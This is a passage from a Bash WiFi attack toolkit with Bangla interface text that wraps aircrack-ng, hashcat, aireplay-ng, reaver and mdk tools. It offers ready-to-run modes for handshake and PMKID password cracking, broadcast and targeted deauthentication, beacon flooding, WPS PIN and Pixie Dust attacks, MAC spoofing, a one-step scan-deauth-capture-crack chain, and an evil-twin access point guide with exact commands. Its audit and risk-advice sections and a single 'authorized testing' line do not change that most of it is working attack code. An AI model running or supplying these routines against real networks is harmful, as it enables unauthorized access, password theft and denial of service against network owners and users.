    [ ! -f "$cap_file" ] && echo -e "${RED}[!] File নেই।${NC}" && return

    local hashcat_mode="22000"
    local converted=""
    local ts; ts=$(date +"%Y%m%d_%H%M%S")

    # Convert if .cap
    if [[ "$cap_file" == *.cap ]]; then
        converted="$RESULTS_DIR/converted_${ts}.22000"
        if command -v hcxpcapngtool &>/dev/null; then
            hcxpcapngtool -o "$converted" "$cap_file" 2>/dev/null
            echo -e "${GREEN}[✓] Converted: $converted${NC}"
            cap_file="$converted"
        elif command -v cap2hccapx &>/dev/null; then
            converted="$RESULTS_DIR/converted_${ts}.hccapx"
            cap2hccapx "$cap_file" "$converted" 2>/dev/null
            hashcat_mode="2500"
            cap_file="$converted"
            echo -e "${GREEN}[✓] Converted to hccapx: $converted${NC}"
        fi
    elif [[ "$cap_file" == *.hccapx ]]; then
        hashcat_mode="2500"
    fi

    read -p "$(echo -e ${WHITE}"Wordlist path (Enter=default): "${NC})" wl_path
    [ -z "$wl_path" ] && wl_path="$DEFAULT_WORDLIST"

    local out="$RESULTS_DIR/hashcat_wifi_${ts}.txt"
    SCAN_LABEL="Hashcat WiFi Crack"

    echo ""
    echo -e "${GREEN}[*] Hashcat crack শুরু হচ্ছে (mode $hashcat_mode)...${NC}"
    echo ""

    local tmp; tmp=$(mktemp)
    hashcat -m "$hashcat_mode" -a 0 \
        --status --status-timer=10 \
        -o "$out" \
        "$cap_file" "$wl_path" 2>&1 | tee "$tmp"

    echo ""
    if [ -f "$out" ] && [ -s "$out" ]; then
        echo -e "${GREEN}${BOLD}[✓] Password found!${NC}"
        cat "$out" | while IFS= read -r line; do echo -e "  ${GREEN}▸ $line${NC}"; done
    fi

    bangla_analysis_crack "$tmp"
    rm -f "$tmp"
    echo "$(date) | Hashcat WiFi | $cap_file | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 13 — CRACK PMKID
# ================================================================
mode_crack_pmkid() {
    echo ""
    read -p "$(echo -e ${WHITE}"PMKID hash file (.22000) path: "${NC})" pmkid_file
    [ ! -f "$pmkid_file" ] && echo -e "${RED}[!] File নেই।${NC}" && return

    read -p "$(echo -e ${WHITE}"Wordlist path (Enter=default): "${NC})" wl_path
    [ -z "$wl_path" ] && wl_path="$DEFAULT_WORDLIST"

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/pmkid_crack_${ts}.txt"
    SCAN_LABEL="PMKID Crack"

    echo ""
    echo -e "${GREEN}[*] PMKID crack করা হচ্ছে...${NC}"
    echo ""

    if command -v hashcat &>/dev/null; then
        local tmp; tmp=$(mktemp)
        hashcat -m 22000 -a 0 --status -o "$out" "$pmkid_file" "$wl_path" 2>&1 | tee "$tmp"
        bangla_analysis_crack "$tmp"
        rm -f "$tmp"
    else
        aircrack-ng -w "$wl_path" "$pmkid_file" 2>&1
    fi

    echo "$(date) | PMKID Crack | $pmkid_file | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 14 — MULTIPLE WORDLISTS
# ================================================================
mode_multiple_wordlists() {
    echo ""
    read -p "$(echo -e ${WHITE}"Capture file path: "${NC})" cap_file
    [ ! -f "$cap_file" ] && echo -e "${RED}[!] File নেই।${NC}" && return

    local combined="$RESULTS_DIR/combined_wl_$(date +%Y%m%d_%H%M%S).txt"
    echo -e "${WHITE}Wordlist paths দিন। শেষ হলে 'done':${NC}"
    while true; do
        read -p "$(echo -e ${WHITE}"Wordlist: "${NC})" wl_path
        [[ "$wl_path" == "done" || -z "$wl_path" ]] && break
        [ -f "$wl_path" ] && cat "$wl_path" >> "$combined" && \
            echo -e "  ${GREEN}[✓] Added: $wl_path${NC}" || echo -e "  ${RED}[!] Not found${NC}"
    done

    [ ! -s "$combined" ] && echo -e "${RED}[!] Empty list.${NC}" && return
    local count; count=$(wc -l < "$combined")
    echo -e "  ${GREEN}[✓] Combined: $count entries${NC}"

    echo ""
    echo -e "${GREEN}[*] Cracking with combined wordlist...${NC}"
    local tmp; tmp=$(mktemp)
    aircrack-ng -w "$combined" "$cap_file" 2>&1 | tee "$tmp"
    bangla_analysis_crack "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 15 — DEAUTH BROADCAST
# ================================================================
mode_deauth_broadcast() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"Target AP BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Packets পাঠাবেন কতটা? (Enter=0=continuous): "${NC})" pkt_count
    [ -z "$pkt_count" ] && pkt_count=0

    echo ""
    echo -e "${RED}${BOLD}[*] Broadcast Deauth attack শুরু হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] এটি সব connected client কে disconnect করবে।${NC}"
    echo ""

    local tmp; tmp=$(mktemp)
    aireplay-ng --deauth "$pkt_count" \
        -a "$TARGET_BSSID" \
        "$MON_INTERFACE" 2>&1 | tee "$tmp"

    bangla_analysis_deauth "$tmp"
    rm -f "$tmp"
    echo "$(date) | Deauth Broadcast | $TARGET_BSSID" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 16 — DEAUTH TARGETED
# ================================================================
mode_deauth_targeted() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"AP BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Client MAC দিন: "${NC})" CLIENT_MAC
    read -p "$(echo -e ${WHITE}"Packets কতটা? (Enter=10): "${NC})" pkt_count
    [ -z "$pkt_count" ] && pkt_count=10

    echo ""
    echo -e "${RED}${BOLD}[*] Targeted Deauth attack...${NC}"
    echo ""

    aireplay-ng --deauth "$pkt_count" \
        -a "$TARGET_BSSID" \
        -c "$CLIENT_MAC" \
        "$MON_INTERFACE" 2>/dev/null

    echo ""
    echo -e "${GREEN}[✓] $pkt_count deauth packets পাঠানো হয়েছে।${NC}"
    echo "$(date) | Deauth Targeted | $TARGET_BSSID → $CLIENT_MAC" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 17 — BEACON FLOOD
# ================================================================
mode_beacon_flood() {
    if ! command -v mdk3 &>/dev/null && ! command -v mdk4 &>/dev/null; then
        echo -e "${YELLOW}[!] mdk3/mdk4 পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Install: sudo apt install mdk3 mdk4${NC}"
        return
    fi

    select_interface
    enable_monitor_mode "$INTERFACE"

    local MDK_CMD="mdk4"; command -v mdk4 &>/dev/null || MDK_CMD="mdk3"

    echo ""
    read -p "$(echo -e ${WHITE}"Duration (seconds, Enter=30): "${NC})" dur
    [ -z "$dur" ] && dur=30

    echo ""
    echo -e "${RED}${BOLD}[*] Beacon flood শুরু হচ্ছে ($dur seconds)...${NC}"
    echo -e "${YELLOW}[!] এটি অনেক fake AP তৈরি করবে।${NC}"
    echo ""

    timeout "$dur" $MDK_CMD "$MON_INTERFACE" b 2>/dev/null

    echo ""
    echo -e "${GREEN}[✓] Beacon flood সম্পন্ন।${NC}"
    echo "$(date) | Beacon Flood | $MON_INTERFACE" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 18 — WPS PIN ATTACK (REAVER)
# ================================================================
mode_wps_reaver() {
    if ! command -v reaver &>/dev/null; then
        echo -e "${YELLOW}[!] reaver পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Install: sudo apt install reaver${NC}"
        return
    fi

    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/reaver_${ts}.txt"
    SCAN_LABEL="WPS Reaver Attack"

    echo ""
    echo -e "${RED}${BOLD}[*] Reaver WPS attack শুরু হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] এটি অনেক সময় নিতে পারে (কয়েক ঘণ্টা)।${NC}"
    echo ""

    local tmp; tmp=$(mktemp)
    reaver -i "$MON_INTERFACE" \
        -b "$TARGET_BSSID" \
        -c "$TARGET_CH" \
        -vv \
        -K 1 2>&1 | tee "$tmp"

    echo ""
    if grep -qi "WPA PSK\|PIN found" "$tmp"; then
        echo -e "${GREEN}${BOLD}[✓] WPS PIN / Password found!${NC}"
        grep -i "WPA PSK\|PIN" "$tmp" | while IFS= read -r line; do
            echo -e "  ${GREEN}▸ $line${NC}"
        done
    fi

    cp "$tmp" "$out"
    echo -e "${GREEN}[✓] Results: $out${NC}"
    rm -f "$tmp"
    echo "$(date) | WPS Reaver | $TARGET_BSSID | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 19 — WPS PIXIE DUST
# ================================================================
mode_wps_pixiedust() {
    if ! command -v reaver &>/dev/null && ! command -v bully &>/dev/null; then
        echo -e "${YELLOW}[!] reaver/bully পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Install: sudo apt install reaver bully${NC}"
        return
    fi

    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/pixiedust_${ts}.txt"
    SCAN_LABEL="Pixie Dust Attack"

    echo ""
    echo -e "${RED}${BOLD}[*] Pixie Dust attack শুরু হচ্ছে...${NC}"
    echo ""

    local tmp; tmp=$(mktemp)

    if command -v reaver &>/dev/null; then
        reaver -i "$MON_INTERFACE" \
            -b "$TARGET_BSSID" \
            -c "$TARGET_CH" \
            -K 1 -vv 2>&1 | tee "$tmp"
    else
        bully "$MON_INTERFACE" \
            -b "$TARGET_BSSID" \
            -c "$TARGET_CH" \
            -d 2>&1 | tee "$tmp"
    fi

    if grep -qi "WPA PSK\|PIN found\|Pixie ATTACK" "$tmp"; then
        echo -e "${GREEN}${BOLD}[✓] Pixie Dust attack সফল!${NC}"
        grep -i "WPA PSK\|PIN" "$tmp" | while IFS= read -r line; do
            echo -e "  ${GREEN}▸ $line${NC}"
        done
    else
        echo -e "${YELLOW}[!] Pixie Dust কাজ করেনি — AP vulnerable নাও হতে পারে।${NC}"
    fi

    cp "$tmp" "$out"
    rm -f "$tmp"
    echo "$(date) | Pixie Dust | $TARGET_BSSID | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 20 — WPS SCAN
# ================================================================
mode_wps_scan() {
    select_interface
    enable_monitor_mode "$INTERFACE"

    echo ""
    echo -e "${CYAN}[*] WPS enabled APs খোঁজা হচ্ছে...${NC}"
    echo ""

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/wps_scan_${ts}.txt"

    # Use wash if available
    if command -v wash &>/dev/null; then
        wash -i "$MON_INTERFACE" 2>/dev/null | tee "$out" &
        local WASH_PID=$!
        sleep 30
        kill $WASH_PID 2>/dev/null

        echo ""
        local wps_count; wps_count=$(grep -c "Yes\|No" "$out" 2>/dev/null || echo 0)
        echo -e "${GREEN}[✓] $wps_count AP পাওয়া গেছে → $out${NC}"

        # Show WPS enabled ones
        echo ""
        echo -e "${CYAN}WPS Enabled APs:${NC}"
        grep "Yes" "$out" 2>/dev/null | while IFS= read -r line; do
            echo -e "  ${RED}▸ $line${NC}"
        done
    else
        echo -e "${YELLOW}[!] wash পাওয়া যায়নি।${NC}"
        echo -e "${CYAN}Install: sudo apt install reaver (includes wash)${NC}"
        echo ""
        echo -e "${WHITE}Alternative: airodump-ng $MON_INTERFACE এ WPS column দেখুন${NC}"
    fi

    echo "$(date) | WPS Scan | $out" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 21 — EVIL TWIN GUIDE
# ================================================================
mode_evil_twin_guide() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          EVIL TWIN AP SETUP GUIDE                       ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Method 1: hostapd + dnsmasq ━━━${NC}"
    echo -e "  ${WHITE}1. Monitor mode interface: wlan0mon${NC}"
    echo -e "  ${WHITE}2. hostapd config তৈরি করুন:${NC}"
    echo -e "  ${YELLOW}echo 'interface=wlan0\\nssid=TARGET_SSID\\nhw_mode=g\\nchannel=6\\nwpa=0' > /tmp/hostapd.conf${NC}"
    echo -e "  ${YELLOW}hostapd /tmp/hostapd.conf &${NC}"
    echo ""
    echo -e "  ${WHITE}3. dnsmasq (DHCP) চালু করুন:${NC}"
    echo -e "  ${YELLOW}dnsmasq --interface=wlan0 --dhcp-range=192.168.1.100,192.168.1.200,12h &${NC}"
    echo ""
    echo -e "  ${WHITE}4. Internet sharing:${NC}"
    echo -e "  ${YELLOW}iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE${NC}"
    echo -e "  ${YELLOW}echo 1 > /proc/sys/net/ipv4/ip_forward${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Method 2: airbase-ng ━━━${NC}"
    echo -e "  ${YELLOW}airbase-ng -a AA:BB:CC:DD:EE:FF -e 'TARGET_SSID' -c 6 wlan0mon${NC}"
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Method 3: hostapd-wpe (Enterprise) ━━━${NC}"
    echo -e "  ${YELLOW}apt install hostapd-wpe${NC}"
    echo -e "  ${YELLOW}hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf${NC}"
    echo ""
    echo -e "${RED}[!] Evil Twin attack শুধুমাত্র authorized testing এ ব্যবহার করুন।${NC}"
    echo ""
}

# ================================================================
# MODE 22 — MAC SPOOF
# ================================================================
mode_mac_spoof() {
    select_interface

    echo ""
    echo -e "${CYAN}MAC Address Spoofing:${NC}"
    echo -e "  ${GREEN}1)${NC} Random MAC generate করো"
    echo -e "  ${GREEN}2)${NC} Custom MAC দাও"
    echo -e "  ${GREEN}3)${NC} Original MAC restore করো"
    read -p "$(echo -e ${YELLOW}"[1-3]: "${NC})" mac_ch

    echo ""
    # Bring interface down
    ip link set "$INTERFACE" down 2>/dev/null

    case $mac_ch in
        1)
            if command -v macchanger &>/dev/null; then
                macchanger -r "$INTERFACE" 2>/dev/null
            else
                # Manual random MAC
                local new_mac; new_mac=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' \
                    $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
                    $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
                ip link set dev "$INTERFACE" address "$new_mac" 2>/dev/null
                echo -e "  ${GREEN}[✓] New MAC: $new_mac${NC}"
            fi
            ;;
        2)
            read -p "$(echo -e ${WHITE}"New MAC (e.g. AA:BB:CC:DD:EE:FF): "${NC})" new_mac
            ip link set dev "$INTERFACE" address "$new_mac" 2>/dev/null
            echo -e "  ${GREEN}[✓] MAC set: $new_mac${NC}"
            ;;
        3)
            if command -v macchanger &>/dev/null; then
                macchanger -p "$INTERFACE" 2>/dev/null
            else
                echo -e "  ${YELLOW}[!] Original MAC restore করতে macchanger install করুন।${NC}"
            fi
            ;;
    esac

    ip link set "$INTERFACE" up 2>/dev/null
    echo ""
    echo -e "${CYAN}Current MAC: $(cat /sys/class/net/$INTERFACE/address 2>/dev/null)${NC}"
    echo "$(date) | MAC Spoof | $INTERFACE" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 23-25 — MONITOR MODE CONTROLS
# ================================================================
mode_enable_monitor() {
    select_interface
    enable_monitor_mode "$INTERFACE"
}

mode_disable_monitor() {
    select_interface
    disable_monitor_mode "$INTERFACE"
}

mode_interface_info() {
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Interface Information ━━━${NC}"
    echo ""
    iwconfig 2>/dev/null | while IFS= read -r line; do
        [ -n "$line" ] && echo -e "  ${WHITE}$line${NC}"
    done
    echo ""
    echo -e "${CYAN}${BOLD}━━━ Wireless Devices (iw) ━━━${NC}"
    iw dev 2>/dev/null | while IFS= read -r line; do
        echo -e "  ${GREEN}$line${NC}"
    done
}

# ================================================================
# MODE 26 — FULL AUTO ATTACK
# ================================================================
mode_full_auto() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║     FULL AUTO ATTACK: Scan → Capture → Crack            ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    select_interface
    enable_monitor_mode "$INTERFACE"

    # Step 1: Scan
    echo -e "${CYAN}━━━ Step 1: Network Scan (30 sec) ━━━${NC}"
    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local scan_out="$RESULTS_DIR/auto_scan_${ts}"

    airodump-ng "$MON_INTERFACE" \
        --write "$scan_out" \
        --output-format csv &>/dev/null &
    local SCAN_PID=$!
    sleep 30
    kill $SCAN_PID 2>/dev/null

    # Show networks
    echo ""
    echo -e "${GREEN}[✓] Networks found:${NC}"
    if [ -f "${scan_out}-01.csv" ]; then
        awk -F',' 'NR>2 && $1~/[0-9A-F:]/{printf "  BSSID: %-20s  CH: %-4s  ESSID: %s\n", $1, $4, $14}' \
            "${scan_out}-01.csv" 2>/dev/null | head -20 | \
            while IFS= read -r line; do echo -e "  ${GREEN}▸ $line${NC}"; done
    fi

    # Step 2: Select target
    echo ""
    read -p "$(echo -e ${WHITE}"Target BSSID দিন: "${NC})" TARGET_BSSID
    read -p "$(echo -e ${WHITE}"Channel দিন: "${NC})" TARGET_CH
    read -p "$(echo -e ${WHITE}"ESSID দিন: "${NC})" TARGET_ESSID

    # Step 3: Capture + Deauth
    echo ""
    echo -e "${CYAN}━━━ Step 2: Capture + Deauth ━━━${NC}"
    local cap_out="$RESULTS_DIR/auto_cap_${ts}"
    CAP_FILE="${cap_out}-01.cap"

    airodump-ng "$MON_INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --channel "$TARGET_CH" \
        --write "$cap_out" \
        --output-format cap &>/dev/null &
    local CAP_PID=$!

    sleep 3
    echo -e "${RED}[*] Deauth packets পাঠানো হচ্ছে...${NC}"
    aireplay-ng --deauth 15 -a "$TARGET_BSSID" "$MON_INTERFACE" 2>/dev/null
    sleep 10
    kill $CAP_PID 2>/dev/null

    # Step 4: Crack
    echo ""
    echo -e "${CYAN}━━━ Step 3: Password Crack ━━━${NC}"
    read -p "$(echo -e ${WHITE}"Wordlist (Enter=default): "${NC})" wl_path
    [ -z "$wl_path" ] && wl_path="$DEFAULT_WORDLIST"

    local tmp; tmp=$(mktemp)
    aircrack-ng -w "$wl_path" -e "$TARGET_ESSID" "$CAP_FILE" 2>&1 | tee "$tmp"

    echo ""
    bangla_analysis_crack "$tmp"
    suggest_next_tool_crack "$tmp"
    rm -f "$tmp"
    echo "$(date) | Full Auto | $TARGET_ESSID | $CAP_FILE" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 27 — ALL IN ONE AUDIT
# ================================================================
mode_allinone_audit() {
    echo ""
    echo -e "${RED}${BOLD}[*] All-in-One WiFi Security Audit শুরু হচ্ছে...${NC}"
    echo ""

    select_interface
    enable_monitor_mode "$INTERFACE"

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local out="$RESULTS_DIR/audit_${ts}"
    local report="$RESULTS_DIR/audit_report_${ts}.txt"

    {
        echo "============================================================"
        echo "  WiFi SECURITY AUDIT REPORT — SAIMUM's Aircrack Tool"
        echo "  Interface: $MON_INTERFACE"
        echo "  Date: $(date)"
        echo "============================================================"
        echo ""
    } > "$report"

    # Scan
    echo -e "${CYAN}━━━ Phase 1: Network Discovery ━━━${NC}"
    airodump-ng "$MON_INTERFACE" --write "${out}_scan" --output-format csv &>/dev/null &
    local SCAN_PID=$!
    sleep 20
    kill $SCAN_PID 2>/dev/null

    if [ -f "${out}_scan-01.csv" ]; then
        local net_count; net_count=$(awk -F',' 'NR>2 && $1~/[0-9A-F:]/{count++} END{print count+0}' "${out}_scan-01.csv")
        echo -e "  ${GREEN}[✓] $net_count networks found${NC}"
        echo "Networks Found: $net_count" >> "$report"

        # WEP networks
        local wep_count; wep_count=$(grep -c "WEP" "${out}_scan-01.csv" 2>/dev/null || echo 0)
        [ "$wep_count" -gt 0 ] && {
            echo -e "  ${RED}[!] $wep_count WEP network found — CRITICAL!${NC}"
            echo "WEP Networks: $wep_count (CRITICAL)" >> "$report"
        }

        # Open networks
        local open_count; open_count=$(grep -c "OPN" "${out}_scan-01.csv" 2>/dev/null || echo 0)
        [ "$open_count" -gt 0 ] && {
            echo -e "  ${YELLOW}[!] $open_count Open (unencrypted) networks!${NC}"
            echo "Open Networks: $open_count (HIGH)" >> "$report"
        }
    fi

    # WPS Scan
    echo ""
    echo -e "${CYAN}━━━ Phase 2: WPS Detection ━━━${NC}"
    if command -v wash &>/dev/null; then
        wash -i "$MON_INTERFACE" 2>/dev/null > "${out}_wps.txt" &
        local WPS_PID=$!
        sleep 15
        kill $WPS_PID 2>/dev/null
        local wps_count; wps_count=$(grep -c "Yes" "${out}_wps.txt" 2>/dev/null || echo 0)
        echo -e "  ${YELLOW}[!] $wps_count WPS enabled APs found${NC}"
        echo "WPS Enabled APs: $wps_count" >> "$report"
    fi

    echo ""
    echo -e "${GREEN}[✓] Audit সম্পন্ন! Report: $report${NC}"

    bangla_analysis_scan "${out}_scan-01.csv"
    echo "$(date) | Full Audit | $MON_INTERFACE | $report" >> "$HISTORY_FILE"
}

# ================================================================
# BANGLA ANALYSIS — SCAN
# ================================================================
bangla_analysis_scan() {
    local csvfile=$1

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় Network বিশ্লেষণ                               ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    [ ! -f "$csvfile" ] && echo -e "  ${YELLOW}[!] CSV file পাওয়া যায়নি।${NC}" && echo "" && return

    local total wep_count wpa_count open_count wpa3_count
    total=$(awk -F',' 'NR>2 && $1~/[0-9A-F:]/{count++} END{print count+0}' "$csvfile")
    wep_count=$(grep -c "WEP" "$csvfile" 2>/dev/null || echo 0)
    wpa_count=$(grep -c "WPA" "$csvfile" 2>/dev/null || echo 0)
    open_count=$(grep -c "OPN" "$csvfile" 2>/dev/null || echo 0)
    wpa3_count=$(grep -c "WPA3\|SAE" "$csvfile" 2>/dev/null || echo 0)

    echo -e "  ${WHITE}মোট Networks  : ${CYAN}$total${NC}"
    echo -e "  ${RED}WEP           : $wep_count টি ${DIM}(অত্যন্ত দুর্বল!)${NC}"
    echo -e "  ${YELLOW}WPA/WPA2      : $wpa_count টি${NC}"
    echo -e "  ${CYAN}WPA3          : $wpa3_count টি ${DIM}(সবচেয়ে নিরাপদ)${NC}"
    echo -e "  ${RED}Open (কোনো encryption নেই) : $open_count টি${NC}"
    echo ""

    if [ "$wep_count" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}🚨 WEP Network পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ WEP ২০০৪ সালেই broken। কয়েক মিনিটে crack হয়।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL — WPA2 এ upgrade করুন।${NC}"; echo ""
    fi

    if [ "$open_count" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}🚨 Open Network পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ কোনো encryption নেই — সব traffic দেখা সম্ভব।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL — Password add করুন।${NC}"; echo ""
    fi

    if [ "$wpa_count" -gt 0 ]; then
        echo -e "  ${YELLOW}${BOLD}⚠ WPA/WPA2 Networks:${NC}"
        echo -e "     ${WHITE}→ Dictionary attack সম্ভব যদি password দুর্বল হয়।${NC}"
        echo -e "     ${YELLOW}→ ঝুঁকি: MEDIUM — Strong password ব্যবহার করুন।${NC}"; echo ""
    fi

    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    if [ "$wep_count" -gt 0 ] || [ "$open_count" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL${NC}"
    elif [ "$wpa_count" -gt 0 ]; then
        echo -e "  ${YELLOW}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW${NC}"
    fi
    echo ""
}

# ================================================================
# BANGLA ANALYSIS — HANDSHAKE
# ================================================================
bangla_analysis_handshake() {
    local capfile=$1
    local essid=$2

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় Handshake বিশ্লেষণ                              ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$capfile" ]; then
        echo -e "  ${YELLOW}[!] Capture file পাওয়া যায়নি।${NC}"
        echo ""
        return
    fi

    local hs_check; hs_check=$(aircrack-ng "$capfile" 2>/dev/null)

    if echo "$hs_check" | grep -q "handshake"; then
        echo -e "  ${GREEN}${BOLD}[✓] WPA Handshake capture হয়েছে!${NC}"
        echo -e "  ${WHITE}Network: ${YELLOW}$essid${NC}"
        echo ""
        echo -e "  ${CYAN}[*] এখন password crack করতে পারবেন:${NC}"
        echo -e "     ${WHITE}→ Aircrack-ng দিয়ে: mode 9 select করুন${NC}"
        echo -e "     ${WHITE}→ Hashcat দিয়ে: mode 12 select করুন (GPU — দ্রুত)${NC}"
        echo ""
        echo -e "  ${YELLOW}${BOLD}⚠ Password strength এর উপর crack সময় নির্ভর করে:${NC}"
        echo -e "     ${RED}→ Simple password (8 chars): কয়েক সেকেন্ড${NC}"
        echo -e "     ${YELLOW}→ Medium password: কয়েক ঘণ্টা${NC}"
        echo -e "     ${GREEN}→ Strong password (12+ mixed): কার্যত impossible${NC}"
        echo ""
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : ███████░░░ HIGH — Crack চেষ্টা সম্ভব${NC}"
    else
        echo -e "  ${YELLOW}[!] Handshake পাওয়া যায়নি।${NC}"
        echo -e "     ${WHITE}→ Deauth attack দিয়ে client reconnect করান (mode 6)${NC}"
        echo -e "     ${WHITE}→ PMKID attack try করুন (mode 7) — client লাগবে না${NC}"
        echo ""
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW (handshake নেই)${NC}"
    fi
    echo ""
}

# ================================================================
# BANGLA ANALYSIS — CRACK
# ================================================================
bangla_analysis_crack() {
    local outfile=$1

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় Crack ফলাফল বিশ্লেষণ                           ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -qi "KEY FOUND\|password\|WPA.* key" "$outfile" 2>/dev/null; then
        local password; password=$(grep -i "KEY FOUND\|password" "$outfile" 2>/dev/null | grep -oP '\[.*?\]' | head -1 | tr -d '[]')
        echo -e "  ${GREEN}${BOLD}🎉 PASSWORD CRACK হয়েছে!${NC}"
        echo -e "  ${WHITE}Password: ${RED}${BOLD}$password${NC}"
        echo ""
        echo -e "  ${CYAN}[*] Password দুর্বলতা বিশ্লেষণ:${NC}"
        local plen=${#password}
        if [ "$plen" -lt 8 ]; then
            echo -e "  ${RED}→ অত্যন্ত দুর্বল! $plen অক্ষর — minimum 12 হওয়া উচিত।${NC}"
        elif [ "$plen" -lt 12 ]; then
            echo -e "  ${YELLOW}→ দুর্বল! $plen অক্ষর — আরো লম্বা করুন।${NC}"
        else
            echo -e "  ${CYAN}→ $plen অক্ষর — length ঠিক আছে কিন্তু wordlist এ ছিল!${NC}"
        fi
        echo ""
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — Network compromised!${NC}"
        echo -e "  ${WHITE}→ অবিলম্বে password পরিবর্তন করুন।${NC}"
        echo -e "  ${WHITE}→ WPA3 ব্যবহার করুন যদি সম্ভব হয়।${NC}"
    else
        echo -e "  ${GREEN}[✓] Password crack হয়নি।${NC}"
        echo -e "     ${WHITE}→ Wordlist এ password ছিল না।${NC}"
        echo -e "     ${WHITE}→ বড় wordlist বা Hashcat GPU crack try করুন।${NC}"
        echo ""
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW (এই wordlist এ নেই)${NC}"
    fi
    echo ""
}

# ================================================================
# BANGLA ANALYSIS — PMKID
# ================================================================
bangla_analysis_pmkid() {
    local hashfile=$1

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় PMKID বিশ্লেষণ                                  ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if [ -f "$hashfile" ] && [ -s "$hashfile" ]; then
        local count; count=$(wc -l < "$hashfile")
        echo -e "  ${GREEN}[✓] $count PMKID hash capture হয়েছে!${NC}"
        echo -e "  ${WHITE}→ Client ছাড়াই WPA handshake এর মতো crack করা যাবে।${NC}"
        echo -e "  ${YELLOW}→ এটি WPA/WPA2 এর একটি বড় vulnerability।${NC}"
        echo ""
        echo -e "  ${CYAN}Crack commands:${NC}"
